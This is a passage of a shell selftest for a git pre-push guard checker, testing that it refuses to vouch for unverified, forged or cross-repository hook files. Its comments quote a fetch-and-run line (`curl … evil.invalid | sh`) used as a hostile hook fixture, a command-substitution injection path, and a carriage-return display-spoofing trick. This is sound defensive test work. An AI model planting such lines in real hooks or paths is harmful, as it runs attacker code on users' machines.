  # are absolute (design §4.5 — a relative source is a broken paste from any subdirectory).
  d=$(k11_fx incepted none) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/MP1 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  _mpd=$( CDPATH='' cd -- "$d" 2>/dev/null && pwd -P ) || _mpd="$d"
  out=$(k11_mp "$d") || out="<k11_mp aborted>"
  rm -rf "$d" 2>/dev/null || true
  _mprc=${out##*MP_RC=}
  # Built as a variable, not inlined: the W3 measurement applies here too — an expansion inside double
  # quotes in a case pattern is LITERAL (so a glob metacharacter in the mktemp path cannot make this
  # vacuously true). Keep the quotes.
  # THE EXPECTED FORM IS WRITTEN OUT LITERALLY, not produced by calling guard_shq: a leg that builds its
  # expectation with the function under test asserts only that the function equals itself. A mktemp path
  # contains no apostrophe, so the literal single-quoted form is exact here.
  # `mkdir -p` is part of the expectation (finding Y7): scripts/incept.sh's guard-install block does it
  # (`mkdir -p "$(dirname "$HOOK_DST")"`) before the identical `cp … && chmod +x`, and `.git/hooks` is
  # not guaranteed to exist.
  _mpfix="mkdir -p '$_mpd/.git/hooks' && cp '$_mpd/hooks/pre-push' '$_mpd/.git/hooks/pre-push' && chmod +x '$_mpd/.git/hooks/pre-push'"
  case "$out" in
    *"ERROR: this repository's pre-push runtime guard is not in force"*"$_mpfix"*)
      if [ "$_mprc" = 1 ]; then
        echo "PASS: K11/MP1 a REAL run in an incepted tree with no guard REFUSES (exit 1) and prints the absolute, POSIX-quoted, paste-able install command"
      else
        echo "FAIL: K11/MP1 the refusal printed but the run did not exit 1 (rc=$_mprc) — the message is decorative ($out)"; fail=1
      fi ;;
    *) echo "FAIL: K11/MP1 a real run in an incepted tree with NO guard did not refuse with the absolute install command (rc=$_mprc) ($out)"; fail=1 ;;
  esac
  # THE COMMAND IS OFFERED CONDITIONALLY ON THE HUMAN'S INSPECTION, NOT VOUCHED FOR (finding X1). The
  # kit cannot verify that an arbitrary file is its guard — the marker is a public substring — so the
  # refusal must hand the human the evidence (a digest) and say who the verifier is. Keyed on the CLAIM
  # (a sha256 line, and the explicit statement that nothing here verified it), not on the sentence.
  case "$out" in
    *"NOTHING HERE HAS VERIFIED IT"*"sha256:"*"If — and only if — that IS the kit's guard"*)
      echo "PASS: K11/MP1 the install command is offered as conditional on human inspection, with a sha256, and states that nothing here verified the source" ;;
    *) echo "FAIL: K11/MP1 the refusal offered an install command WITHOUT withdrawing the vouch and without a digest to verify against — the script is claiming a verification it cannot perform ($out)"; fail=1 ;;
  esac
  # Y2 — THE REFUSAL-PATH CEILING GETS ITS LOCK. Measured before this assertion existed: deleting the
  # six-line closing paragraph left the selftest at 126 PASS / 0 FAIL, because every other MP assertion
  # is `case "$out" in *A*B*)` where B is the fix line, and nothing after it was constrained. The plan
  # declares those lines load-bearing and this file's own rule is "a security fix with no leg is a
  # claim, not a control" — J5 locked the HAPPY-path caveat (P1); the REFUSAL path never got one.
  # Keyed on the three CLAIMS that make the caveat mean something (not a boundary · installing it does
  # not make main safe · --no-verify defeats it), so a reword survives and a deletion does not.
  case "$out" in
    *"not a boundary"*"does NOT make main"*"--no-verify"*)
      echo "PASS: K11/MP1 the refusal closes with the honest ceiling — not a boundary, does NOT make main safe, --no-verify skips it" ;;
    *) echo "FAIL: K11/MP1 the refusal printed a fix line with NO honest ceiling after it — a repaired guard would be read as protection the kit does not have ($out)"; fail=1 ;;
  esac

  # MP2 — incepted + guard present but NOT EXECUTABLE, whole script from the fixture ROOT. The inert
  # branch of design §4.5 shipped unproven end-to-end in the plan's own leg table (E1/A1/A2 covered
  # absent and the two silent classes and nothing else), and inert needs a DIFFERENT fix — chmod, not cp.
  # The negative half is load-bearing: a refusal block that printed the install command for every state
  # would satisfy an inert leg that only looked for "exit 1".
  d=$(k11_fx incepted inert) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/MP2 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  _mpd=$( CDPATH='' cd -- "$d" 2>/dev/null && pwd -P ) || _mpd="$d"
  out=$(k11_mp "$d") || out="<k11_mp aborted>"
  rm -rf "$d" 2>/dev/null || true
  _mprc=${out##*MP_RC=}
  _mpchmod="chmod +x '$_mpd/.git/hooks/pre-push'"
  case "$out" in
    *"cp '$_mpd/hooks/pre-push'"*)
      echo "FAIL: K11/MP2 an INERT guard was told to re-install (cp) instead of chmod — the two states are not discriminated in the refusal ($out)"; fail=1 ;;
    *"pre-push runtime guard is not in force"*"$_mpchmod"*)
      if [ "$_mprc" = 1 ]; then
        echo "PASS: K11/MP2 a REAL run with an inert (non-executable) guard REFUSES (exit 1) and names chmod +x, not a re-install"
      else
        echo "FAIL: K11/MP2 the inert refusal printed but the run did not exit 1 (rc=$_mprc) ($out)"; fail=1
      fi ;;
    *) echo "FAIL: K11/MP2 a real run with an inert guard did not refuse naming chmod +x on the absolute path (rc=$_mprc) ($out)"; fail=1 ;;
  esac

  # MP4 BEFORE MP3, deliberately: this run is ALSO the ambient baseline MP3 differentials against. A
  # directory that is not a git repo at all has no hook, no obligation, and nothing for this check to
  # say — so whatever rc preflight returns here is the environment's answer, not ours.
  # MP4 — a bare (non-repo) directory: exit code unchanged from the ambient baseline, and SILENT.
  # INITIALIZED BEFORE THE RUN THAT SETS IT (finding J8): MP3 reads this variable and the two legs are
  # coupled across ~20 lines, so under `set -u` a future reordering (MP3 first) aborted the WHOLE
  # selftest with an unbound-variable error — no verdict line, which silences
  # the trailer line with it — instead of failing one leg. `unset` is a value MP3's
  # numeric comparison can never match, so a genuinely unset baseline FAILS MP3 loudly rather than
  # passing by accident. QUOTED because `unset` is also a shell builtin and the bare form trips
  # SC2209 ("use var=$(command) to assign output, or quote to assign string") — this is a string.
  _mpbase_rc='unset'
  _mpbare=$(mktemp -d) || _mpbare=""
  [ -n "$_mpbare" ] || { echo "FAIL: K11/MP4 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; _mpbare=$K11_NOFX; }
  # SWAS-784: still a non-repo directory, but export-shaped (the principles CLAUDE.md), or the real body refuses it as no project and the exit-0 half is unobservable. Under the unbuildable sentinel the write fails and `|| true` keeps the leg's own FAIL.
  printf 'Engineering Principles & Definition of Done\n' > "$_mpbare/CLAUDE.md" 2>/dev/null || true
  out=$(k11_mp "$_mpbare") || out="<k11_mp aborted>"
  rm -rf "$_mpbare" 2>/dev/null || true
  _mpbase_rc=${out##*MP_RC=}
  # TWO CLAIMS, TWO LINES, because exactly one of them is always observable (finding J4). The SILENCE
  # claim holds in every environment. The EXIT-0 claim does not: if the ambient environment already
  # exits non-zero in a bare dir (no jq, say), it is unobservable here — and the previous single line
  # printed `PASS:` anyway, for a claim it had not tested, while MP3 then differentialled two
  # identically-broken codes against each other. A `PASS:` for an unobservable claim is precisely the
  # "a green attests the test RAN, never that the claim is true" pattern this kit gates against, so that
  # branch now says WEAK: — visible in the log, and honest about which of the two legs is load-bearing
  # in this environment. (It does not set `fail`: an ambient tool gap is not this check's defect. The
  # anti-wolf half above still fails hard.)
  case "$out" in
    *"Runtime guard:"*) echo "FAIL: K11/MP4 a real run CRIED WOLF about the guard in a directory that is not a git repo ($out)"; fail=1 ;;
    *) echo "PASS: K11/MP4 a real run in a bare non-repo directory is SILENT on the guard"
       if [ "$_mpbase_rc" = 0 ]; then
         echo "PASS: K11/MP4 a real run in a bare non-repo directory exits 0 (no obligation, no verdict)"
       else
         echo "WEAK: K11/MP4 the exit-0 half is NOT OBSERVABLE here — this environment already exits $_mpbase_rc in a bare directory for an ambient reason (a missing tool), so it is not asserted; MP3's differential against this baseline is correspondingly weak in this environment"
       fi ;;
  esac

  # MP3 — ANTI-WOLF, end to end. A kit-source tree has no guard obligation, so a real run must not print
  # the section and must not change its verdict. A1 asserts the same claim of the FUNCTION; MP3 asserts
  # it of the RUN, which is where an operator meets it. Design §6 records why neither can be found by a
  # mutation sweep — an over-broad predicate still fails whenever it should fail, so every mutant dies
  # and the sweep reports health. MP3/MP4 earn their place only as explicit fixtures.
  d=$(k11_fx kit-source none) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/MP3 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  out=$(k11_mp "$d") || out="<k11_mp aborted>"
  rm -rf "$d" 2>/dev/null || true
  _mprc=${out##*MP_RC=}
  case "$out" in
    *"Runtime guard:"*) echo "FAIL: K11/MP3 a real run CRIED WOLF on a pre-inception kit-source tree — the gate doctor.sh:18 says is ignored within a month ($out)"; fail=1 ;;
    *) if [ "$_mprc" = "$_mpbase_rc" ]; then
         echo "PASS: K11/MP3 a real run in a kit-source tree prints no guard section and does not change the verdict (rc $_mprc = the no-obligation baseline)"
       else
         echo "FAIL: K11/MP3 a kit-source tree CHANGED the run's exit code (rc=$_mprc vs the no-obligation baseline $_mpbase_rc) — silent, but not harmless ($out)"; fail=1
       fi ;;
  esac

  # MP5 — from a SUBDIRECTORY under --allow-nested: the check STILL JUDGES, and offers NO COMMAND.
  #
  # THIS LEG'S SECOND HALF IS INVERTED FROM WHAT T2 SHIPPED, and the inversion is the finding.
  # T2 asserted that a subdirectory run under --allow-nested prints the paste-able install command with
  # both paths absolutized. The security review (X1) showed that command is the cross-repo attack: under
  # --allow-nested in a FOREIGN enclosing repo, the trusted kit's preflight was reproduced vouching for
  # THAT repo's hooks/pre-push — a genuine trust-boundary crossing, and `hooks/pre-push` carries no
  # CODEOWNERS rule, so it is PR-modifiable. NO SIGNAL distinguishes the benign monorepo-package case
  # from the hostile enclosing-repo case: both are exactly `--show-toplevel != $PWD`. The kit's rule for
  # that shape is fail-safe plus a signpost, so the command is withheld and the recovery is NAMED
  # ("re-run from the repo root"), which the operator of a real monorepo can act on in one step.
  #
  # THE FIRST HALF IS UNCHANGED AND STILL LOAD-BEARING: the check must still JUDGE here. Reaching it
  # from a subdirectory REQUIRES --allow-nested (CP-11 refuses first — measured 2026-07-21,
  # `git dir lives outside it`, rc 1 — and so would CP-4), and a LINKED WORKTREE trips CP-11 too
  # (measured: rc 1 without the flag, 0 with it), so --allow-nested is the ONLY way a real run reaches
  # this check from a worktree. Going silent would leave legs W1/W2/H3 — the whole worktree lane —
  # correct and unreachable in every real run. So: judge, refuse, exit 1 — but offer no command.
  # The two halves together are what make the leg discriminating: an implementation that always speaks
  # or one that never does fails one of them.
  d=$(k11_fx incepted none) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/MP5 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  _mpd=$( CDPATH='' cd -- "$d" 2>/dev/null && pwd -P ) || _mpd="$d"
  mkdir -p "$d/src/deep/nested" || true   # `|| true`: under the unbuildable sentinel this mkdir MUST
                                          # fail (ENOTDIR), and `set -e` would kill the run, not the leg
  out=$(k11_mp "$d/src/deep/nested" --allow-nested) || out="<k11_mp aborted>"
  rm -rf "$d" 2>/dev/null || true
  _mprc=${out##*MP_RC=}
  case "$out" in
    *"cp '$_mpd/hooks/pre-push'"*|*"cp \"$_mpd/hooks/pre-push\""*)
      echo "FAIL: K11/MP5 a run that is NOT at the root of its own repository was still handed an install command for the ENCLOSING repository's hooks/pre-push — the cross-repo vouch (X1) ($out)"; fail=1 ;;
    # THE SIGNPOST IS ANCHORED ON ITS DURABLE HALF, not on a whole sentence. The T3 form of this pattern
    # quoted "Re-run preflight from the root of the repository you own" verbatim, and finding W-1 — which
    # is purely a REWORDING of this arm, to stop telling a monorepo developer their own repo is not
    # theirs — turned it RED. A leg that reds on a wording change it does not care about teaches the next
    # author to edit the leg rather than think about it. The claim is "the refusal names the recovery",
    # so the anchor is the phrase that IS the recovery; the rest of the sentence is free to improve.
    *"pre-push runtime guard is not in force"*"NO INSTALL COMMAND IS OFFERED"*"Re-run preflight from"*)
      if [ "$_mprc" = 1 ]; then
        echo "PASS: K11/MP5 from a SUBDIRECTORY under --allow-nested the check still JUDGES and exits 1, but offers NO install command for a tree whose ownership was never asserted — and names the recovery"
      else
        echo "FAIL: K11/MP5 the nested refusal printed but the run did not exit 1 (rc=$_mprc) ($out)"; fail=1
      fi ;;
    *"Runtime guard:"*)
      echo "FAIL: K11/MP5 from a subdirectory the guard section printed but the refusal neither offered the command nor withheld it with the signposted reason ($out)"; fail=1 ;;
    *) echo "FAIL: K11/MP5 --allow-nested SILENCED the guard check from a subdirectory (rc=$_mprc) — the linked-worktree lane W1/W2/H3 lock would be unreachable in every real run ($out)"; fail=1 ;;
  esac

  # MP6 (T2 fix-loop, finding J1) — THE CALL SITE'S PLACEMENT, not just its existence.
  #
  # The placement was argued in 14 lines of comment at the call site and asserted by NOTHING. Measured
  # (2026-07-21, this tree): hoisting `check_guard_installed` above `if git_env_redirected` — mutant M-E
  # — left ALL of MP1..MP5 green and the selftest printing `OK: preflight selftest`, while a real run
  # from a subdirectory printed
  #     Runtime guard:
  #       MISS pre-push guard — not installed at <ENCLOSING-repo>/.git/hooks/pre-push
  # BEFORE the CP-11 refusal. That is a verdict about a repository the operator does not own, which is
  # the exact CP-4/CP-11 class the placement comment invokes — and this file's own rule applies to it:
  # "A security fix with no leg is a claim, not a control."
  #
  # SAME FIXTURE AS MP5, ONE FLAG DIFFERENT, and that is what makes the pair discriminating: MP5 proves
  # the check still JUDGES from a subdirectory under --allow-nested (the operator opted in), MP6 proves
  # it stays SILENT there WITHOUT the flag (the operator did not). A leg asserting only one of those is
  # satisfiable by a check that always speaks or one that never does.
  #
  # THE NEGATIVE HALF IS THE LOAD-BEARING HALF and it names BOTH surfaces, because the two live at
  # opposite ends of the script and a mutant can move either one: `Runtime guard:` is the section header
  # check_guard_installed prints, and `pre-push runtime guard is not in force` is the main-body refusal.
  # Asserting the CP-11 refusal alone would be green under M-E — M-E still refuses, it just talks about
  # someone else's repo first.
  d=$(k11_fx incepted none) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/MP6 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  mkdir -p "$d/src/deep/nested" || true   # `|| true` for the reason MP5/W3 carry it: under the
                                          # unbuildable sentinel this mkdir MUST fail (ENOTDIR), and
                                          # `set -e` would kill the run rather than the leg
  out=$(k11_mp "$d/src/deep/nested") || out="<k11_mp aborted>"   # NO --allow-nested — that is the leg
  rm -rf "$d" 2>/dev/null || true
  _mprc=${out##*MP_RC=}
  case "$out" in
    *"git dir lives outside it"*)
      if [ "$_mprc" = 1 ]; then
        echo "PASS: K11/MP6 from a nested dir WITHOUT --allow-nested the CP-11 refusal still fires and exits 1"
      else
        echo "FAIL: K11/MP6 the CP-11 refusal printed but the run did not exit 1 (rc=$_mprc) ($out)"; fail=1
      fi ;;
    *) echo "FAIL: K11/MP6 a nested run without --allow-nested did not reach the CP-11 refusal at all (rc=$_mprc) — this leg's negative half below is then unanchored ($out)"; fail=1 ;;
  esac
  case "$out" in
    *"Runtime guard:"*)
      echo "FAIL: K11/MP6 the guard section printed BEFORE the CP-11 refusal — preflight passed judgment on a repository the operator does not own (the call site is upstream of the refusals; mutant M-E) ($out)"; fail=1 ;;
    *"pre-push runtime guard is not in force"*)
      echo "FAIL: K11/MP6 the K11 REFUSAL fired on a repository the operator does not own — the call site is upstream of the CP-11/CP-4 refusals ($out)"; fail=1 ;;
    *) echo "PASS: K11/MP6 nothing about the guard is said about a repo the operator does not own — the call site is DOWNSTREAM of the CP-11/CP-4 refusals (kills mutant M-E)" ;;
  esac

  # MP7 (T2 fix-loop, finding J2 — SECURITY) — the install command names a source it VERIFIES.
  #
  # The refusal's `absent` arm hands a human a paste-able `cp <src> <dst> && chmod +x <dst>`. Design §4.3
  # makes the KIT_GUARD_CORE marker the single definition of "the kit's hook" and the DESTINATION half is
  # judged by it — the SOURCE half was exempt. Measured before the fix (2026-07-21): a fixture whose
  # hooks/pre-push was `curl -s http://evil.invalid/ | sh` produced the full `cp … && chmod +x …`
  # instruction, with no caveat, telling a human to install an unverified script into .git/hooks/. In a
  # tree the operator did not author — and under --allow-nested, the ENCLOSING repo — that is the whole
  # attack. Every other leg was green.
  #
  # THE ASSERTION IS THE ABSENCE OF THE COMMAND, not the presence of a warning: a refusal that printed
  # both would still be pasted. It is anchored to the refusal having actually fired, because "no cp line"
  # is also what a check that says nothing at all emits.
  d=$(k11_fx incepted none-foreign-src) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/MP7 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  _mpd=$( CDPATH='' cd -- "$d" 2>/dev/null && pwd -P ) || _mpd="$d"
  out=$(k11_mp "$d") || out="<k11_mp aborted>"
  rm -rf "$d" 2>/dev/null || true
  _mprc=${out##*MP_RC=}
  # Double-quoted expansion in a case pattern is LITERAL — the W3 measurement; keep the quotes.
  case "$out" in
    *"cp \"$_mpd/hooks/pre-push\""*)
      echo "FAIL: K11/MP7 the refusal handed a human a paste-able 'cp' installing a source it never verified — that source does NOT carry KIT_GUARD_CORE ($out)"; fail=1 ;;
    *"pre-push runtime guard is not in force"*"$_mpd/hooks/pre-push"*)
      if [ "$_mprc" = 1 ]; then
        echo "PASS: K11/MP7 a hooks/pre-push that is NOT the kit's guard yields NO install command — it is named and refused, and the operator is sent to re-export (§4.3: KIT_GUARD_CORE is the only definition)"
      else
        echo "FAIL: K11/MP7 the unverified-source refusal printed but the run did not exit 1 (rc=$_mprc) ($out)"; fail=1
      fi ;;
    *) echo "FAIL: K11/MP7 an unverified install source produced neither the refusal naming it nor a cp line (rc=$_mprc) — the leg cannot tell safe from silent ($out)"; fail=1 ;;
  esac

  # MP8 (T2 fix-loop, finding J2, cheap sibling) — the SOURCE MAY NOT EXIST AT ALL. An incepted tree that
  # lost hooks/pre-push got a `cp` against a path that is not there: a fix line that cannot work, which
  # teaches the reader the tool is wrong rather than that the tree is. Same KIT_GUARD_CORE predicate
  # answers this one for free (an unreadable/absent file carries no marker), so this leg costs one
  # fixture and pins that the two arms did not diverge.
  d=$(k11_fx incepted none-no-src) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/MP8 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  _mpd=$( CDPATH='' cd -- "$d" 2>/dev/null && pwd -P ) || _mpd="$d"
  out=$(k11_mp "$d") || out="<k11_mp aborted>"
  rm -rf "$d" 2>/dev/null || true
  _mprc=${out##*MP_RC=}
  case "$out" in
    *"cp \"$_mpd/hooks/pre-push\""*)
      echo "FAIL: K11/MP8 the refusal printed a 'cp' from a source that does not exist — a fix line that cannot work ($out)"; fail=1 ;;
    *"pre-push runtime guard is not in force"*"adopter-export.sh"*)
      if [ "$_mprc" = 1 ]; then
        echo "PASS: K11/MP8 a MISSING hooks/pre-push yields no cp line and points at re-export instead (mirrors incept.sh:977)"
      else
        echo "FAIL: K11/MP8 the missing-source refusal printed but the run did not exit 1 (rc=$_mprc) ($out)"; fail=1
      fi ;;
    *) echo "FAIL: K11/MP8 a missing install source produced neither a re-export pointer nor a cp line (rc=$_mprc) ($out)"; fail=1 ;;
  esac

  # MP9 (T2 fix-loop, finding J3) — the UNREADABLE arm of the refusal, through the MAIN PATH. U1 locks
  # that the unreadable STATE is armed; nothing locked that the refusal block then names the right fix,
  # so a state whose fix line was wrong (or missing — the generic `*)` arm) shipped green. `chmod +r` is
  # the discriminating string: it is the only fix line no other state prints.
  # Same non-root condition U1 uses: chmod 000 is not a read barrier for uid 0.
  if [ "$(id -u)" = "0" ]; then
    echo "SKIP: K11/MP9 unreadable-hook main-path leg — running as uid 0, where chmod 000 is not a read barrier (ci.yml runs conformance-core as a non-root user, so CI does exercise it)"
  else
    d=$(k11_fx incepted unreadable) || d=""
    [ -n "$d" ] || { echo "FAIL: K11/MP9 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
    _mpd=$( CDPATH='' cd -- "$d" 2>/dev/null && pwd -P ) || _mpd="$d"
    out=$(k11_mp "$d") || out="<k11_mp aborted>"
    chmod 700 "$d/.git/hooks/pre-push" 2>/dev/null || true; rm -rf "$d" 2>/dev/null || true
    _mprc=${out##*MP_RC=}
    _mpchmodr="chmod +r '$_mpd/.git/hooks/pre-push'"
    case "$out" in
      *"cp '$_mpd/hooks/pre-push'"*)
        echo "FAIL: K11/MP9 an UNREADABLE guard was told to re-install (cp) — the state's own fix is the permission bit ($out)"; fail=1 ;;
      *"pre-push runtime guard is not in force"*"$_mpchmodr"*)
        if [ "$_mprc" = 1 ]; then
          echo "PASS: K11/MP9 a REAL run with an UNREADABLE guard REFUSES (exit 1) and names chmod +r on the absolute path"
        else
          echo "FAIL: K11/MP9 the unreadable refusal printed but the run did not exit 1 (rc=$_mprc) ($out)"; fail=1
        fi ;;
      *) echo "FAIL: K11/MP9 a real run with an unreadable guard did not refuse naming chmod +r on the absolute path (rc=$_mprc) ($out)"; fail=1 ;;
    esac
  fi

  # — MP10 / MP11 / Q1 / E4 (FINAL fix-loop): the security review's own attacks, as legs ——————
  # Every one of these was REPRODUCED against the T2 tree before it was written. They exist because
  # each blocker was a PARTIAL application of a rule this file already stated correctly, and the only
  # thing that distinguishes "applied everywhere" from "applied where someone looked" is a leg per
  # instance.

  # MP10 (finding X1) — A FORGED MARKER MUST NOT PRODUCE A VOUCH.
  # MP7's fixture omits KIT_GUARD_CORE, so MP7 models an attacker who did not try; it passed against a
  # `grep -q` substring test that any hostile hook can satisfy by writing the token in a COMMENT.
  # MEASURED against the T2 tree: a hooks/pre-push of `# KIT_GUARD_CORE` + `curl -s http://evil.invalid/x
  # | sh` received the full `Fix (a HUMAN must run this…)` + `cp … && chmod +x …`, with no caveat.
  # FOUR CLAIMS, because the fix has four parts and a leg per part is the point:
  #   (a) the vouching wording must be GONE — the script must state that it has verified nothing;
  #   (b) a DIGEST must be printed, because "you are the verifier" is empty without something to verify;
  #   (c) NO LINE OF THE SOURCE FILE MAY APPEAR IN THE OUTPUT AT ALL, and no CR may reach the terminal;
  #   (d) the human must be told HOW to inspect it (their own tools) and to RE-CHECK the digest.
  # CLAIM (c) REPLACES the T3 claim it is descended from, and the replacement is the finding. T3 asserted
  # that the 6-line preview "cannot impersonate a verdict", greping the OUTPUT BYTES for this check's own
  # happy-path line. That leg was green and the attack worked anyway (finding H-1): the preview's `tr`
  # range omitted CR, so a hostile line rendered its `    | ` prefix away and the preview READ as the
  # genuine kit guard, while the payload sat on line 7 below the window. A byte-grep cannot see a
  # RENDERING substitution — so the claim is no longer "the rendered content is inert" (undecidable from
  # a shell) but "there is no rendered content", which is decidable and is what the code now does.
  # THE ASSERTION IS DRIVEN FROM THE FIXTURE'S OWN BYTES, not from a hand-written list: every line of the
  # hostile file is read back and looked for in the output. A leg that enumerated the lines it expected
  # would be blind to the line it forgot, which is this slice's whole failure mode.
  d=$(k11_fx incepted none-forged-src) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/MP10 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  _mpd=$( CDPATH='' cd -- "$d" 2>/dev/null && pwd -P ) || _mpd="$d"
  out=$(k11_mp "$d") || out="<k11_mp aborted>"
  # Captured BEFORE the fixture is removed — claim (c) compares the output against the file's real bytes.
  _mp10src=$(cat "$d/hooks/pre-push" 2>/dev/null) || _mp10src=""
  rm -rf "$d" 2>/dev/null || true
  _mprc=${out##*MP_RC=}
  case "$out" in
    *"Fix (a HUMAN must run this"*"cp '$_mpd/hooks/pre-push'"*|*"Fix (a HUMAN must run this"*"cp \"$_mpd/hooks/pre-push\""*)
      echo "FAIL: K11/MP10 a hostile hooks/pre-push carrying KIT_GUARD_CORE in a COMMENT received a VOUCHED install command — the marker is a public substring and cannot verify anything ($out)"; fail=1 ;;
    *"NOTHING HERE HAS VERIFIED IT"*"sha256:"*"If — and only if — that IS the kit's guard"*)
      if [ "$_mprc" = 1 ]; then
        echo "PASS: K11/MP10 a forged KIT_GUARD_CORE marker yields no vouch — the refusal states that nothing verified the source, prints a sha256, and makes the command conditional on human inspection"
      else
        echo "FAIL: K11/MP10 the un-vouched wording printed but the run did not exit 1 (rc=$_mprc) ($out)"; fail=1
      fi ;;
    *) echo "FAIL: K11/MP10 a forged-marker source produced neither a vouched command nor the human-verifier wording (rc=$_mprc) ($out)"; fail=1 ;;
  esac
  # (c) NO FILE CONTENT IS RENDERED. Driven from the fixture's own bytes: a here-doc (a redirection, not
  # a pipe) so the loop runs in THIS shell and `_mp10leak` survives it. `case … in *"$line"*` is a
  # LITERAL substring test — the value is quoted, so the CR and the shell metacharacters in the payload
  # are data, not pattern.
  _mp10leak=0; _mp10lines=0
  while IFS= read -r _mp10l || [ -n "$_mp10l" ]; do
    [ -n "$_mp10l" ] || continue
    _mp10lines=$(( _mp10lines + 1 ))
    case "$out" in *"$_mp10l"*) _mp10leak=$(( _mp10leak + 1 )) ;; esac
  done <<EOF
$_mp10src
EOF
  if [ "$_mp10lines" -lt 7 ]; then
    echo "FAIL: K11/MP10 the hostile fixture yielded only $_mp10lines readable lines — claim (c) is not asserting what it says (the fixture, not the code, is broken)"; fail=1
  elif [ "$_mp10leak" = 0 ]; then
    echo "PASS: K11/MP10 NO line of the attacker-controlled source appears in the refusal — all $_mp10lines lines checked, including the CR-spoof lines and the line-7 payload the old 6-line preview could never have shown"
  else
    echo "FAIL: K11/MP10 $_mp10leak of $_mp10lines lines of the hostile hook were RENDERED into the refusal — a security verdict must reference untrusted content, never display it ($out)"; fail=1
  fi
  # (c), second half: NO CARRIAGE RETURN may reach the terminal. This is the exact primitive H-1 used —
  # the bytes were innocent and the RENDERING was the substitution — so it gets its own assertion rather
  # than being folded into the line test, which a CR-free future attack would pass.
  _mp10cr=$(printf '%s' "$out" | LC_ALL=C tr -dc '\015' | wc -c | tr -d ' ') || _mp10cr=0
  if [ "${_mp10cr:-0}" = 0 ]; then
    echo "PASS: K11/MP10 the refusal emits no CARRIAGE RETURN — the byte that overwrote the preview's '    | ' prefix and made a hostile file render as the genuine guard cannot reach the terminal"
  else
    echo "FAIL: K11/MP10 the refusal emitted $_mp10cr carriage return(s) — a hostile line can overwrite this message's own prefixes and impersonate any line in it ($out)"; fail=1
  fi
  # (d) THE FRAMING SURVIVES THE DELETION. "You are the verifier" without an affordance is worse than
  # nothing, so the refusal must name the tools that CAN discriminate and must close the TOCTOU the
  # digest leaves open (the file can change between this print and the human's paste — un-closeable from
  # a shell script, which is why it is said out loud instead of pretended away).
  case "$out" in
    *"less '"*"git log -p -- hooks/pre-push"*"re-check"*)
      echo "PASS: K11/MP10 the refusal tells the human HOW to inspect the file with their own tools (less, git log -p) and to RE-CHECK the digest before pasting — the framing survives the excerpt's deletion" ;;
    *) echo "FAIL: K11/MP10 the refusal names no inspection affordance and/or no re-check prompt — 'YOU are the verifier' with nothing to verify with is the assurance-manufacturing this finding is about ($out)"; fail=1 ;;
  esac

  # MP11 (finding X1, the CROSS-REPO half) — the trust-boundary crossing, reproduced as a leg.
  # This is the case the security review measured and MP5 cannot reach: preflight run from a directory
  # inside an ENCLOSING repository whose hooks/pre-push is hostile. The kit's own trusted preflight
  # vouched for THAT repository's hook — and `hooks/pre-push` has no CODEOWNERS rule, so it is
  # PR-modifiable. MP5 uses a benign source, so a marker-only implementation passes MP5 and fails here:
  # the forged marker means the cheap filter says yes, and ONLY the ownership rule withholds the command.
  # That pairing is what makes this leg discriminating rather than a duplicate of MP5.
  d=$(k11_fx incepted none-forged-src) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/MP11 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  _mpd=$( CDPATH='' cd -- "$d" 2>/dev/null && pwd -P ) || _mpd="$d"
  mkdir -p "$d/vendored-package" || true   # `|| true` for the reason MP5/MP6/W3 carry it: under the
                                           # unbuildable sentinel this mkdir MUST fail (ENOTDIR)
  out=$(k11_mp "$d/vendored-package" --allow-nested) || out="<k11_mp aborted>"
  rm -rf "$d" 2>/dev/null || true
  _mprc=${out##*MP_RC=}
  case "$out" in
    *"cp '$_mpd/hooks/pre-push'"*|*"cp \"$_mpd/hooks/pre-push\""*)
      echo "FAIL: K11/MP11 CROSS-REPO VOUCH — run inside a directory owned by an ENCLOSING repository, preflight handed a human a command installing THAT repository's hooks/pre-push into .git/hooks/ ($out)"; fail=1 ;;
    *"NO INSTALL COMMAND IS OFFERED"*"ENCLOSING"*)
      if [ "$_mprc" = 1 ]; then
        echo "PASS: K11/MP11 a run inside an enclosing repository's tree gets NO install command — the source belongs to a repository whose ownership was never asserted, and the refusal says so"
      else
        echo "FAIL: K11/MP11 the cross-repo refusal printed but the run did not exit 1 (rc=$_mprc) ($out)"; fail=1
      fi ;;
    *) echo "FAIL: K11/MP11 the cross-repo case produced neither a vouched command nor the ownership refusal (rc=$_mprc) ($out)"; fail=1 ;;
  esac

  # Q1 (finding X2) — THE EMITTED COMMAND IS INJECTION-INERT.
  # Double quotes do NOT neutralise `$(…)` or backticks. MEASURED against the T2 tree: a repository root
  # named `pkg$(touch …/PWNED)x` produced a fix line whose paste CREATED the file. This is not exotic
  # input — `git check-ref-format --branch 'x$(id)y'` ACCEPTS the name (measured), so any CI workspace
  # derived from a branch or PR name is attacker-shaped.
  # THE ASSERTION IS THE ABSENCE OF `$(` OUTSIDE SINGLE QUOTES, expressed the only way that is decidable
  # from the outside: the emitted command must contain the SINGLE-QUOTED form of the hostile path. A
  # double-quoted `"…$(touch…)…"` cannot satisfy that pattern, and the fixture's `$(…)` payload is
  # inert-by-construction (it writes only inside the fixture, which is removed either way).
